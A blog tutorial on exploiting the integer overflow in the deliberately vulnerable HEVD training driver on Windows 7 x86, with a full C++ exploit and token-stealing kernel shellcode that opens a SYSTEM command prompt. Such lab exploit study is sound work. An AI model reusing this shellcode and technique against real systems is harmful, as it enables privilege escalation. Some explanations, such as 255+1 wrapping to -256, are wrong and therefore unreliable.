---
layout: single
title: HEVD - Windows 7 x86 Kernel Integer Overflow
---

This post covers the exploitation of the integer overflow that resides within the HEVD driver. 

The final code on my Github [https://github.com/FULLSHADE/HEVD-Exploits/blob/master/Windows7x86/IntergerOverflow.cpp](https://github.com/FULLSHADE/HEVD-Exploits/blob/master/Windows7x86/IntergerOverflow.cpp)

## What is an integer overflow?

An integer overflow vulnerability exists when the result of an arithmetic operation occurs such as multiplication or addition, and it exceeds the maximum size of the integer type that is being used to store the result. For example, if an integer stores the result of an operation with 255 as the value, and then 1 is added to it, it **should** be 256, but it since it overflows, it wraps around and becomes -256.  

## Secure (non-vulnerable) Source code analysis

The secure code for the HEVD driver (2.00) can be found in the `IntegerOverflow.c` source code file. 

```c
if (Size > (sizeof(KernelBuffer) - TerminatorSize)) {
    DbgPrint("[-] Invalid UserBuffer Size: 0x%X\n", Size);

    Status = STATUS_INVALID_BUFFER_SIZE;
    return Status;
}
```

With the secure function, you can see the program is properly handling the user input by subtracting the ULONG given buffer. `ULONG KernelBuffer[BUFFER_SIZE] = {0};` if the kernel buffer, and the definition of the BUFFER_SIZE is within the header file, putting the buffer at 255 bytes.

```c
NTSTATUS TriggerIntegerOverflow(IN PVOID UserBuffer, IN SIZE_T Size) {
    ULONG Count = 0;
    NTSTATUS Status = STATUS_SUCCESS;
    ULONG BufferTerminator = 0xBAD0B0B0;
    ULONG KernelBuffer[BUFFER_SIZE] = {0};
    SIZE_T TerminatorSize = sizeof(BufferTerminator);
```

`Size` is the user-mode buffer that's being passed to the driver, this function states that if the user given buffer is **bigger** than the `KernelBuffer` (255 bytes), then it will subtract the `TerminatorSize`, and the `TerminatorSize` is equal to the size of the `BufferTerminator` which is equal to `0xBAD0B0B0`.

## Non-Secure (vulnerable) Source code analysis

Comparing this to the vulnerable function shows us the classic integer overflow occurring.

```c
if ((Size + TerminatorSize) > sizeof(KernelBuffer)) {
    DbgPrint("[-] Invalid UserBuffer Size: 0x%X\n", Size);

    Status = STATUS_INVALID_BUFFER_SIZE;
    return Status;
```

Where if the `Size` (user-mode buffer) and the `TerminatorSize` (size of 0xBAD0B0B0, which is 4 bytes.) combined are larger than the size of the kernel buffer, it will than perform the copy operation.

## Reverse engineering with IDA

`A special thanks to @h0mbre for this part ;) you know you would end up on my blog`

We can load the HEVD.sys driver into IDA, and if you navigate to the `TriggerIntegerOverflow(x,x)` function you can see the secure vs. vulnerable function taking place, and you can see the check occuring with the user buffer. And how it then passes data to the driver.

![first func](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/int/integer1.png)


At first, you can see the user buffer size being loaded into ebx with the following code.

```c
push    [ebp+UserBuffer] ; Address
call    ds:__imp__ProbeForRead@12 ; ProbeForRead(x,x,x)
push    [ebp+UserBuffer]
push    offset Format   ; "[+] UserBuffer: 0x%p\n"
call    _DbgPrint
mov     ebx, [ebp+Size] ;<----- user buffer size being loaded into ebx
push    ebx             ;<----- ebx is pushed onto the stack
```

![2](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/int/integer2.png)


You can see the comparison of the `TerminatorSize` being compared to eax, and eax is our ebp.

```c
mov     eax, [ebp+UserBuffer]
mov     eax, [eax]
mov     ecx, 0BAD0B0B0h
cmp     eax, ecx
jz      short loc_149F1
```


## Exploitation method

Since the `TerminatorSize` is equal to 4 bytes, if we provide a buffer size between 0xfffffffc and 0xffffffff, the driver will add 4 bytes to the integer, triggering the vulnerability, because it will wrap around on itself and bypass the check that's performed.

```c
while (Count < (Size / sizeof(ULONG))) {
    if (*(PULONG)UserBuffer != BufferTerminator) {
        KernelBuffer[Count] = *(PULONG)UserBuffer;
        UserBuffer = (PULONG)UserBuffer + 1;
        Count++;
    }
    else {
        break;
    }
}
}
```

### Driver communication

We can discover the IOCTL for this vulnerability class just like we have done in all of the previous posts, you can either reverse the driver in IDA or calculate the IOCTL from the source code CTL_MACRO definition.

The provided IOCTL for this vulnerability class is: 222027

` #define HEVD_0x00222027 CTL_CODE(0x22, 0x809, METHOD_NEITHER, FILE_ANY_ACCESS`

![ioctl](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/int/integer3.png)

We can use `CreateFileA` like always to establish the handler to our driver, this is just standard driver IO 101.

```c++
HANDLE hDevice = CreateFileA(DEVICE_NAME,
			 GENERIC_READ | GENERIC_WRITE,
			 FILE_SHARE_READ | FILE_SHARE_WRITE,
			 NULL,
			 OPEN_EXISTING,
			 FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
			 NULL);

if (hDevice == INVALID_HANDLE_VALUE){
std::cout << "[!] Failed to establish a device handler" << GetLastError() << std::endl;
} else {
std::cout << "[+] Established a handle to the device - " << DEVICE_NAME << std::endl;
}
```

To trigger this vulnerability, we need to 

### Trigger the vulnerability

```c++
    std::cout << "[+] Preparing the buffer payload\n";
    BYTE input_buff[0x751] = { 0 };
	
    memset(
        input_buff,
        '\x41',
        0x750);

    DWORD sizeReturn;
    BOOL deviceCom = DeviceIoControl(hDevice,
                    IOCTL,
                    uBuffer,
                    0xffffffff,
                    NULL,
                    0,
                    &sizeReturn,
                    NULL);
    if(deviceCom){
        std::cout << "[+] Successfully send buffer payload to the driver\n";
    }
    return 0;
}

```

We can now get a crash on our breakpoint set at the `HEVD!TriggerIntegerOverflow+0xa9` function

### Exploitation of the vulnerability

We can start by  creating our user mode buffer, this can be done by setting aside 2096 bites, these bites will be the input buffer filler, that lead up to the EIP register. 

`BYTE userBuffer[0x830] = { 0 }; // should be 0x830 - 2096`

After creating this buffer we can then use the memset  function to move A’s  into the user mode buffer. This user mode buffer will be used to send to the device driver.

Then we can take this user-mode buffer, and add our shellcode address next to it. The shellcode address takes up another four 4 bytes,  and then add remaining 4 byte, which are going to be the Terminator string.

`memcpy(userBuffer + 0x828, &shellcode_address, 0x4);`

Now you can create a byte array for the Terminator string, and then allocated with the user mode buffer. 

```
BYTE terminator[] = "\xb0\xb0\xd0\xba";
memcpy(userBuffer + 0x82c, &terminator, 0x4);
```
After all of this has been finalized, you can then use the DeviceIoControl  function to send the user buffer,  the address 0xfffffff,  and an empty size return.

If all this is successful, and all of your memory allocations have been properly set up. The token stealing shellcode payload will Traverse the EPROCESS  data structure within system applications that are running, and steal their access token, and then you can spawn a new command prompt with elevated permissions.  You can use the createprocess  function to spawn a new command prompt, or you can just use the system function to spawn a new CMD shell.

After putting this all together, here is the final exploit's source code.

```c++
#include <windows.h>
#include <iostream>
#include <string>

#define DEVICE_NAME "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL 0x222027

int main(){
    std::cout << "[+] HEVD - Integer overflow Windows 7 x86 exploit POC\n\n";
    HANDLE hDevice = CreateFileA(DEVICE_NAME,
                                 GENERIC_READ | GENERIC_WRITE,
                                 FILE_SHARE_READ | FILE_SHARE_WRITE,
                                 NULL,
                                 OPEN_EXISTING,
                                 FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL,
                                 NULL);

    if (hDevice == INVALID_HANDLE_VALUE){
        std::cout << "[!] Failed to establish a device handler" << GetLastError() << std::endl;
    } else {
        std::cout << "[+] Established a handle to the device - " << DEVICE_NAME << std::endl;
    }

    // --------------------------------------------------------------------------- //
    //                  Preparing the shellcode payload to be sent
    // --------------------------------------------------------------------------- //
   char shellcodePayload[] = (
          "\x60"
          "\x64\xA1\x24\x01\x00\x00"
          "\x8B\x40\x50"
          "\x89\xC1"
          "\x8B\x98\xF8\x00\x00\x00"
          "\xBA\x04\x00\x00\x00"
          "\x8B\x80\xB8\x00\x00\x00"
          "\x2D\xB8\x00\x00\x00"
          "\x39\x90\xB4\x00\x00\x00"
          "\x75\xED"
          "\x8B\x90\xF8\x00\x00\x00"
          "\x89\x91\xF8\x00\x00\x00"
          "\x61"
          "\x5d"
          "\xc2\x08\x00"
          );

    LPVOID shellcode_address = VirtualAlloc(NULL,
                sizeof(shellcodePayload),
                MEM_RESERVE | MEM_COMMIT,
                PAGE_EXECUTE_READWRITE);

    memcpy(shellcode_address, shellcodePayload , sizeof(shellcodePayload));
    std::cout << "[+] Shellcode allocated at " << std::hex << shellcode_address << std::endl;

    // --------------------------------------------------------------------------- //
    //                  Now we prepare the user buffer to be sent
    // --------------------------------------------------------------------------- //

    std::cout << "[+] Preparing the buffer payload\n";

    BYTE userBuffer[0x830] = { 0 }; // should be 0x830 - 2096
    memset(userBuffer, '\x41', 0x828); // setting the buffer up to EIP
    // for above, buffer should be 0x828 - 2088

    std::cout << "[+] Allocating the user-mode buffer - " << sizeof(userBuffer) << std::endl;

    memcpy(userBuffer + 0x828, &shellcode_address, 0x4); // put the shellcode address right after the buffer
    // for above, userbuffer + 2088
    BYTE terminator[] = "\xb0\xb0\xd0\xba";
    memcpy(userBuffer + 0x82c, &terminator, 0x4);
  
    std::cout << "\t[+] Preparing terminator bytes\n";
  	std::cout << "\t[+] Finalization of the user buffer complete\n";
  
    std::cout << "[+] Sending final buffer of size: " << sizeof(userBuffer) << std::endl;
    DWORD sizeReturn = 0x0;
    int deviceCom = DeviceIoControl(hDevice,
                    IOCTL,
                    &userBuffer,
                    0xffffffff,
                    NULL,
                    0,
                    &sizeReturn,
                    NULL);
    if(deviceCom){
        std::cout << "[+] Successfully send buffer payload to the driver\n";
        std::cout << "[+] Spawning NT SYSTEM cmd prompt, enjoy!\n";

        STARTUPINFO StartupInfo;
        PROCESS_INFORMATION ProcessInformation;

        ZeroMemory(&StartupInfo, sizeof(StartupInfo));
        ZeroMemory(&ProcessInformation, sizeof(ProcessInformation));

        BOOL aCreated;
        aCreated = CreateProcessA("C:\\Windows\\System32\\cmd.exe",
                                  NULL,
                                  NULL,
                                  NULL,
                                  0,
                                  CREATE_NEW_CONSOLE,
                                  NULL,
                                  NULL,
                                  &StartupInfo, &ProcessInformation);
        if(aCreated == FALSE){
            std::cout << "[!] failed to launch process - " << GetLastError() << std::endl;

        }
    } else {
        std::cout << "[!] Failed to send payload to the device driver\n";
    }
    return 0;
}
```

### EOP and a shell

Due to the nature of this kernel-mode driver,  as a low-level user, and unprivileged user. And from a low Integrity process standpoint, we have the ability to communicate with it from user mode. You can now run your compiled exploit in order to obtain system access via a NT Authority command prompt with your stolen access token.

![shell](https://raw.githubusercontent.com/FULLSHADE/FULLSHADE.github.io/master/static/img/_posts/int/hevd-int.png)

### Wrapup

Conclusively,  we were able to conduct a source code analysis of the vulnerable application,  while that if certain circumstances were met, and certain addresses were passed to the application,  you had the ability to bypass the check when data is sent between user and kernel-mode as a buffer. 

We were able to discover an IOCTL  within the kernel-mode driver,  communicate to it and send it a small buffer that triggers the vulnerability,  and finally creating an allocating The Terminator string, which is one of the final aspects of us being able to bypass the check. 

Putting this all together we utilize the same shellcode token stealing payload while adding a cleanup routine to the end of it. This gave us an NT Authority system shell, successfully escalating our privileges on the system from an unprivileged low-level user standpoint, too. full access rights on the system.

The final code on my Github [https://github.com/FULLSHADE/Windows-Kernel-Exploitation-HEVD/blob/master/HEVD_Interger_Overflow.cpp](https://github.com/FULLSHADE/Windows-Kernel-Exploitation-HEVD/blob/master/HEVD_Interger_Overflow.cpp)
